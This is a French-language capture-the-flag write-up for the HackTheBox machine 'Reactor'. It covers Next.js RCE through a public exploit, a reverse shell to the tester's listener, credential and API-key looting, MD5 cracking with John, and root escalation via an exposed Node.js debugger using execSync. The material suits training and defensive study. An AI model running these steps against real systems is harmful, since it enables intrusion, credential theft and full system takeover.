# Write-up -- HackTheBox : Reactor

Write-up réalisé pour la machine Reactor de HackTheBox. La chaîne d'exploitation enchaîne une RCE sur une application Next.js vulnérable (CVE-2025-55182), la récupération de credentials depuis une base SQLite embarquée, et une escalade de privilèges via un debugger Node.js exposé en écoute locale en tant que root.

L'IP de la machine pendant ma session était `10.129.17.34`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sS -sV -sC -p- 10.129.17.34
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Next.js
| X-Powered-By: Next.js
| x-nextjs-cache: HIT
```

**2 ports TCP ouverts** : SSH sur le 22 et une application web sur le 3000. Les headers de la réponse HTTP trahissent immédiatement le framework : `X-Powered-By: Next.js`. Le nom de la machine laissait déjà entendre qu'on allait travailler avec React.

On visite `http://10.129.17.34:3000/` : une interface de monitoring d'un réacteur, sans interaction visible.

---

## Étape 2 -- Identification de la version et de la CVE

On vérifie la version exacte de Next.js avec Wappalyzer : **15.0.3**.

Cette version est vulnérable à la **CVE-2025-55182**, également connue sous le nom **React2Shell**. La vulnérabilité repose sur une **pollution de prototype** au niveau des React Server Components (RSC) : en manipulant les payloads RSC envoyés au serveur, un attaquant peut injecter des propriétés dans le prototype d'Object et déclencher une exécution de code arbitraire côté serveur, sans aucune authentification.

---

## Étape 3 -- CVE-2025-55182 : RCE et obtention d'un shell

On clone l'exploit React2Shell disponible sur GitHub et on le lance directement contre la cible :

```bash
python3 r2s.py -u http://10.129.17.34:3000/
```

```
[VULN] http://10.129.17.34:3000/ >>> RCE SUCCESS
       Output: uid=999(node) gid=988(node) groups=988(node)

[+] Stateful Interactive RCE shell started.
next-rce:/opt/reactor-app$
```

L'exploit confirme la RCE et ouvre un shell interactif directement. On est en tant qu'utilisateur `node`.

Pour obtenir un reverse shell plus stable, on démarre un listener puis on utilise la commande intégrée à l'outil :

```bash
# Sur notre machine :
nc -lvnp 4444

# Dans le shell de l'exploit :
next-rce:/opt/reactor-app$ reverse 10.10.15.45 4444
```

La connexion arrive. On stabilise le shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Étape 4 -- Première Fouille 

On explore `/opt/reactor-app` :

```bash
ls
# app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

Deux éléments intéressants : un fichier `.env` et une base de données `reactor.db`.

Le `.env` contient la configuration de l'application :

```bash
cat .env
```

```
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

NODE_ENV=production
```

On note la clé API et le webhook pour plus tard, mais c'est la base SQLite qui nous intéresse en priorité.

---

## Étape 5 -- Extraction des credentials depuis reactor.db

On se connecte à la base avec `sqlite3` :

```bash
sqlite3 reactor.db
```

On liste les tables :

```
sqlite> .tables
sensor_logs  users
```

On dump la table `users` :

```
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

On a deux comptes avec leurs **hashs MD5**. Le compte `engineer` correspond à un utilisateur système qu'on a repéré sur la machine, c'est lui qu'on cible.

---

## Étape 6 -- Crack du hash MD5 et accès en tant qu'engineer

On copie le hash de `engineer` dans un fichier et on le soumet à John The Ripper en précisant le format MD5 :

```bash
john -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
```

```
reactor1         (?)
1g 0:00:00:00 DONE
Session completed.
```

Le mot de passe est **`reactor1`**. On bascule sur le compte `engineer` depuis notre shell :

```bash
su engineer
# Password: reactor1
```

---

## Étape 7 -- Flag user

```bash
engineer@reactor:~$ cat user.txt
```

**Flag user :** `5114264ea8d8cdce46d7e299ff1f9750`

---

## Étape 8 — Découverte du debugger Node.js exposé en root

On inspecte les processus en cours d'exécution :

```bash
ps -aux
```

```
root  1370  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Un processus Node.js tourne en tant que **root** avec le flag `--inspect=127.0.0.1:9229`. Ce flag active le **debugger** de Node.js, qui expose une interface de débogage sur le port 9229 accessible uniquement depuis localhost. Cette interface permet d'injecter et d'exécuter du JavaScript arbitraire dans le contexte du processus, ici, root.

---

## Étape 9 -- Exploitation du debugger Node.js et flag root

On se connecte au debugger via le client `node inspect` :

```bash
node inspect 127.0.0.1:9229
```

On passe en mode **REPL** (Read-Eval-Print Loop), qui permet d'exécuter des expressions JavaScript interactivement dans le contexte du processus cible :

```
debug> repl
```

On vérifie d'abord qu'on est bien en tant que root. La fonction `execSync` retourne un `Uint8Array` par défaut, il faut le convertir en string pour lire le résultat :

```javascript
> process.mainModule.require('child_process').execSync('id').toString()
'uid=0(root) gid=0(root) groups=0(root)\n'
```

On est root. On lit directement le flag :

```javascript
> process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
'0fce324e03f333cab65796594be649ea\n'
```

**Flag root :** `0fce324e03f333cab65796594be649ea`
